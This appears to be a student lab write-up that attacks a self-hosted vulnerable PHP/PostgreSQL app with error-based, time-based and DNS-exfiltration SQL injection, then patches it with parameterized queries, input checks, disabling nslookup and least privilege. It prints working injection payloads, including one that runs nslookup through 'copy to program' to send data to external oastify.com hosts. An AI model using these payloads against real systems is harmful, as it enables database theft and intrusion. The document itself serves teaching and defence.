## Overview 
- To have a deeper understanding of how SQL injection works, we will host a web application that is vulnerable to SQLi then we will apply 3 types of attacks: error-based sql injection, time-based injection and data extraction with DNS. After finished demonstrating the impact of the attack, we will patch these vulnerabilities with some secure methods for example parameterized queries, sanitize input, least privilege, etc. We will divide our project into 2 parts:
    - Part 1: Deploy attack vector
    - Part 2: Apply the defencing mechanism

### Part 1: Deploy attack vector
![](https://i.imgur.com/0t5dwUR.png)
- All sql injection types maybe use a different way to extract data. However, they all follow this attacking model.
### Error-based SQL injection
- The basic mechanism of Error-based SQL injection triggers an error in which the error notification shows more information then it needs to, and from there sql injection happened. To have a deeper demonstration of this attack we will use sqlmap to perform exploitation and let this packet running through a proxy to analyze traffic.
- ![](https://i.imgur.com/U8HNM6z.png)

- for example:
    - Query: `http://localhost/ATM_Project/getProduct.php?productId=1 AND 8311=CAST((CHR(113)||CHR(113)||CHR(98)||CHR(120)||CHR(113))||(SELECT%20brand from products WHERE id=1)||(CHR(113)||CHR(120)||CHR(122)||CHR(107)||CHR(113)) AS NUMERIC) --`
    - Result: ![](https://i.imgur.com/3pHoRDx.png)
- In this section, we will demonstrate how mentioned the attack model works with error-based SQL injection.
    - Step 1: Getting schema
        - We exploit error-based vulnerability with CURRENT_SCHEMA function(Note that all the qqbx and qxzkq cover around information that leak is there for programming purpose).
        - Query: `AND 5838=CAST((CHR(113)||CHR(113)||CHR(98)||CHR(120)||CHR(113))||(COALESCE(CAST(CURRENT_SCHEMA() AS VARCHAR(10000))::text,(CHR(32))))::text||(CHR(113)||CHR(120)||CHR(122)||CHR(107)||CHR(113)) AS NUMERIC)`
        - Result:![](https://i.imgur.com/2vdNoFC.png)
    - Step 2: Getting the table
        - We will find out the number of table that exist in this schema by counting the tablename value.
            - Query: `1 AND 7321=CAST((CHR(113)||CHR(113)||CHR(98)||CHR(120)||CHR(113))||(SELECT COALESCE(CAST(COUNT(tablename) AS VARCHAR(10000))::text,(CHR(32))) FROM pg_tables WHERE schemaname IN ((CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99))))::text||(CHR(113)||CHR(120)||CHR(122)||CHR(107)||CHR(113)) AS NUMERIC)`
            - Result: ![](https://i.imgur.com/HQTz8FA.png)
 
        - After that, we will find out what is the name of the table by selecting tablename value from pgtables then using OFFSET LIMIT to get the first table.
            - Query: `1 AND 8791=CAST((CHR(113)||CHR(113)||CHR(98)||CHR(120)||CHR(113))||(SELECT COALESCE(CAST(tablename AS VARCHAR(10000))::text,(CHR(32))) FROM pg_tables WHERE schemaname IN ((CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99))) OFFSET 0 LIMIT 1)::text||(CHR(113)||CHR(120)||CHR(122)||CHR(107)||CHR(113)) AS NUMERIC)`
            - Result:
             ![](https://i.imgur.com/5hpheWN.png)
    - Step 3: Getting column
        - We will get the number of column by count(*) with the condition on id and relname as table name and nspname as schema name.
            - Query: `1 AND 2067=CAST((CHR(113)||CHR(113)||CHR(98)||CHR(120)||CHR(113))||(SELECT COALESCE(CAST(COUNT(*) AS VARCHAR(10000))::text,(CHR(32))) FROM pg_attribute b JOIN pg_class a ON a.oid=b.attrelid JOIN pg_type c ON c.oid=b.atttypid JOIN pg_namespace d ON a.relnamespace=d.oid WHERE b.attnum>0 AND a.relname=(CHR(112)||CHR(114)||CHR(111)||CHR(100)||CHR(117)||CHR(99)||CHR(116)||CHR(115)) AND nspname=(CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)))::text||(CHR(113)||CHR(120)||CHR(122)||CHR(107)||CHR(113)) AS NUMERIC)`
            - Result: ![](https://i.imgur.com/MFIZILQ.png)
        - After this, we will find out the name of the first column by using attname column by joining other tables with id and relname as table and nspname as schema.
            - Query: `1 AND 7273=CAST((CHR(113)||CHR(113)||CHR(98)||CHR(120)||CHR(113))||(SELECT COALESCE(CAST(attname AS VARCHAR(10000))::text,(CHR(32))) FROM pg_attribute b JOIN pg_class a ON a.oid=b.attrelid JOIN pg_type c ON c.oid=b.atttypid JOIN pg_namespace d ON a.relnamespace=d.oid WHERE b.attnum>0 AND a.relname=(CHR(112)||CHR(114)||CHR(111)||CHR(100)||CHR(117)||CHR(99)||CHR(116)||CHR(115)) AND nspname=(CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)) ORDER BY attname OFFSET 0 LIMIT 1)::text||(CHR(113)||CHR(120)||CHR(122)||CHR(107)||CHR(113)) AS NUMERIC)`
            - Result: ![](https://i.imgur.com/2fuvJyI.png)
        - Finally, we will get the column type base on typname column by joining other tables with id and relname as table and nspname as schema.
            - Query: `1 AND 4733=CAST((CHR(113)||CHR(113)||CHR(98)||CHR(120)||CHR(113))||(SELECT COALESCE(CAST(typname AS VARCHAR(10000))::text,(CHR(32))) FROM pg_attribute b JOIN pg_class a ON a.oid=b.attrelid JOIN pg_type c ON c.oid=b.atttypid JOIN pg_namespace d ON a.relnamespace=d.oid WHERE b.attnum>0 AND a.relname=(CHR(112)||CHR(114)||CHR(111)||CHR(100)||CHR(117)||CHR(99)||CHR(116)||CHR(115)) AND nspname=(CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)) ORDER BY attname OFFSET 0 LIMIT 1)::text||(CHR(113)||CHR(120)||CHR(122)||CHR(107)||CHR(113)) AS NUMERIC)`
            - Result: ![](https://i.imgur.com/6YVrD1R.png)
    - Step 5: Data extrafilcation
        - After having information about the first column, table, and schema, getting information about all other columns, tables and schema can be achive in the same way, so on we can extract all the data now, here is our result after using sqlmap to exploit.
            - Result: ![](https://i.imgur.com/FJl9yxV.png)
### Time-based SQL injection
- On the next attacking type(it also follows the mentioned attacking vector), we gonna base on time to exploit SQL injection. In this attack, we will trigger a sleep statement on the server by using SLEEP function, and based on this mechanism we will make the server sleep when it returns the right condition and no sleep for the opposite. The only disadvantage of this attack is that it takes a lot of time to fully extract the data because the true false condition only can work with 1 word per time and if it right condition server needs to wait seconds for the tool to verify the word.
    - For example: On the first query, we will extract the schema name by using time wait with the true false condition. As you can see the server takes 5 seconds to load the website as we take the first letter int cast is larger than 64 which is correct. From there we got the first letter of the schema name.
        - Query: `1 AND 9407=(CASE WHEN (ASCII(SUBSTRING((COALESCE(CAST(CURRENT_SCHEMA() AS VARCHAR(10000))::text,(CHR(32))))::text FROM 1 FOR 1))>64) THEN (SELECT 9407 FROM PG_SLEEP(5)) ELSE 9407 END)` 
        - Result:![](https://i.imgur.com/GFOgph7.png)
- In this way, sqlmap will flow the mentioned attacking vector and retrieve all the data here is our result.
    - Result:
    ![](https://i.imgur.com/mWOc3jQ.png)
    ![](https://i.imgur.com/4TTRH1c.png)
    ![](https://i.imgur.com/Jl8mpT1.png)
### data exfiltration with DNS
- Query explains:
    -  create OR replace function f() returns void as $$

        declare c text;

        declare p text;

        begin

        SELECT into p (SELECT 1);

        c := ’copy (SELECT ’’’’) to program’’nslookup’||p||’.npgc1o120ye14jzuxpnx0eal4ca2yr.oastify.com’’’;

        execute c;

        END;

        $$ language plpgsql security definer;

        SELECT f();
     - This function will trigger nslookup to make DNS record to our DNS server within that DNS record we can perform SQL injection following the mentioned attack vector. Then we will extract all it data in the same way that we did previously on other attacks.
- For example:
    - Getting Schema name:
    - `COALESCE(CAST(CURRENT_SCHEMA() AS VARCHAR(10000))::text,(CHR(32)));create OR replace function f() returns void as $$ declare c text; declare p text; begin SELECT into p (SELECT COALESCE(CAST(CURRENT_SCHEMA() AS VARCHAR(10000))::text,(CHR(32)))); c := 'copy (SELECT '''') to program ''nslookup '||p||'.w9639d3gudbp3yd1y62pzjkojfp5du.oastify.com'''; execute c; END; $$ language plpgsql security definer; SELECT f()`
    - ![](https://i.imgur.com/gsbk5SB.png)
    - ![](https://i.imgur.com/I59IrTI.png)
    - Getting data with special case character, we need to use regex to remove all this data as these special character is not available to make the query.
        - `SELECT unnest(regexp_split_to_array((SELECT brand FROM products OFFSET 0 LIMIT 1), '[, .\”%!:@#$&*(){}\[\]+_-]+')) AS parts OFFSET 0 LIMIT 1`
        - ![](https://i.imgur.com/lN7WlSR.png)
        - ![](https://i.imgur.com/5nREUBo.png)
- Our final result:
    - ![](https://i.imgur.com/TbqlYnr.png)
    - ![](https://i.imgur.com/5jOKr9e.png)
### Part 2: Deploy defense mechanism
- Now we will move to the defense mechanism
- Pramaterize query
    - We will change the way we process our input
        - ![](https://i.imgur.com/Qb5MulF.png)
    - Now we will test if it is still attackable 
        - ![](https://i.imgur.com/xE0lLfI.png)
        - ![](https://i.imgur.com/VTxIoyQ.png)
        - ![](https://i.imgur.com/Ak132mC.jpg)
- Sanitilize input:
    - On this protection mechanism we will add some productId checker to see if this productId is correct.
        - ![](https://i.imgur.com/ln7SQiN.png)
    - If it not correct we will redirect it to a 404 not found website
        - ![](https://i.imgur.com/0WCE3Jy.png)
    - Testing with sqlmap
        - ![](https://i.imgur.com/7YOOEM1.png)
- DNS lookup disabled:
    - We all know that to trigger dns lookup postgres uses nslookup built-in in os so if we remove this functionality on os data with DNS exfiltration is impossible
        - ![](https://i.imgur.com/x0Ea2LO.png)
        - ![](https://i.imgur.com/E9t8Poo.png)
    - here is our result
        - ![](https://i.imgur.com/tg8v5GI.png)
- Set Privilege:
    - We need to set the lowest privilege in case our database is breached so we can lower the attack impact.
    - ![](https://i.imgur.com/xahTixS.png)
    - ![](https://i.imgur.com/v9bv2Oi.png)
    - ![](https://i.imgur.com/Nbzycfs.jpg)
    - ![](https://i.imgur.com/kK636Lx.png)
    - ![](https://i.imgur.com/gQMikZn.png)
    - Here is our result
    - ![](https://i.imgur.com/gQJ8k8o.png)
 
